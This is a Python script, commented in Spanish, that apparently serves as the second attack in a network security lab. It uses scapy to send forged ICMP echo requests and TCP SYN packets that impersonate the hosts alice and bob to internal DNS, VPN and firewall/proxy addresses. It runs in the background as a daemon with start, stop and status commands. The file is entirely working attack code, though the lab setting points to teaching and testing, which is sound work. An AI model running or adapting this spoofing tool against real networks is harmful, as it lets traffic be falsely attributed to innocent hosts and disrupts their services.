#!/usr/bin/env python3
"""
Ataque 2 — IP Spoofing
John envia paquetes con src=alice (192.168.1.2) y src=bob (192.168.1.3)
hacia DNS (192.168.3.2) y proxy (192.168.4.66).

Efectos observables:
  - dns/proxy ven trafico ICMP procedente de alice/bob
  - alice/bob reciben ICMP replies inesperados (no los solicitaron)
  - proxy connection tracking muestra SYN de alice/bob en puerto 80
  - Demuestra que la atribucion de trafico por IP es falsificable

Stop: solo kill (paquetes stateless, no dejan estado persistente).

Uso: python3 attack_spoof.py [start|stop|status]
"""

import sys
import os
import signal
import time

PID_FILE = "/tmp/attack_spoof.pid"

SPOOFED_SRCS = [
    ("alice", "192.168.1.2"),
    ("bob",   "192.168.1.3"),
]

# Destinos ICMP: alcanzables directamente via RIP desde John
ICMP_TARGETS = [
    ("dns", "192.168.3.2"),
    ("vpn", "192.168.3.3"),
]

# Destino TCP SYN: firewall_extern puerto 80, que tiene DNAT -> proxy:80
# La IP 192.168.4.2 esta en RIP (192.168.4.0/26 via router_d)
TCP_TARGET = ("firewall_ext->proxy", "192.168.4.2", 80)

INTERVAL = 3   # segundos entre rafagas


def attack_loop():
    from scapy.all import IP, ICMP, TCP, send

    print(f"[SPOOF] Iniciando IP Spoofing como alice ({SPOOFED_SRCS[0][1]}) / bob ({SPOOFED_SRCS[1][1]})", flush=True)
    print(f"[SPOOF] ICMP -> {[t for t, _ in ICMP_TARGETS]}", flush=True)
    print(f"[SPOOF] TCP SYN :80 -> {TCP_TARGET[1]} (DNAT -> proxy)", flush=True)

    seq = 0
    while True:
        for alias, src_ip in SPOOFED_SRCS:
            # ICMP spoofed hacia dns y vpn
            for tgt_name, dst_ip in ICMP_TARGETS:
                pkt = IP(src=src_ip, dst=dst_ip) / ICMP(type=8, id=seq, seq=seq)
                send(pkt, verbose=False)
                print(f"[SPOOF] ICMP  {src_ip:15s} ({alias}) -> {dst_ip} ({tgt_name})", flush=True)

            # TCP SYN spoofed hacia firewall_ext:80 (redirige al proxy via DNAT)
            tgt_name, dst_ip, dst_port = TCP_TARGET
            pkt = IP(src=src_ip, dst=dst_ip) / TCP(sport=10000 + seq % 55000,
                                                    dport=dst_port, flags="S", seq=seq)
            send(pkt, verbose=False)
            print(f"[SPOOF] TCP SYN {src_ip:15s} ({alias}) -> {dst_ip}:{dst_port} ({tgt_name})", flush=True)

            seq += 1

        time.sleep(INTERVAL)


def start():
    if os.path.exists(PID_FILE):
        pid = open(PID_FILE).read().strip()
        print(f"[!] El ataque ya esta activo (PID {pid}). Para primero con 'stop'.")
        sys.exit(1)

    pid = os.fork()
    if pid > 0:
        open(PID_FILE, "w").write(str(pid))
        print(f"[+] IP Spoofing iniciado (PID {pid})")
        sys.exit(0)

    os.setsid()
    sys.stdout = open("/tmp/attack_spoof.log", "w", buffering=1)
    sys.stderr = sys.stdout
    attack_loop()


def stop():
    if not os.path.exists(PID_FILE):
        print("[-] El ataque no esta activo.")
        return

    pid = int(open(PID_FILE).read().strip())
    try:
        os.kill(pid, signal.SIGTERM)
        time.sleep(0.5)
    except ProcessLookupError:
        print("[!] Proceso no encontrado, limpiando PID file.")

    os.remove(PID_FILE)
    # Sin cleanup activo: paquetes IP son stateless
    print("[+] IP Spoofing detenido. No requiere cleanup (paquetes stateless).")


def status():
    if os.path.exists(PID_FILE):
        pid = open(PID_FILE).read().strip()
        alive = os.path.exists(f"/proc/{pid}")
        state = "activo" if alive else "PID file huerfano"
        print(f"[*] IP Spoofing: {state} (PID {pid})")
        print(f"    Log: tail -f /tmp/attack_spoof.log")
    else:
        print("[-] IP Spoofing: inactivo")


if __name__ == "__main__":
    if len(sys.argv) < 2 or sys.argv[1] not in ("start", "stop", "status"):
        print(f"Uso: {sys.argv[0]} [start|stop|status]")
        sys.exit(1)
    {"start": start, "stop": stop, "status": status}[sys.argv[1]]()
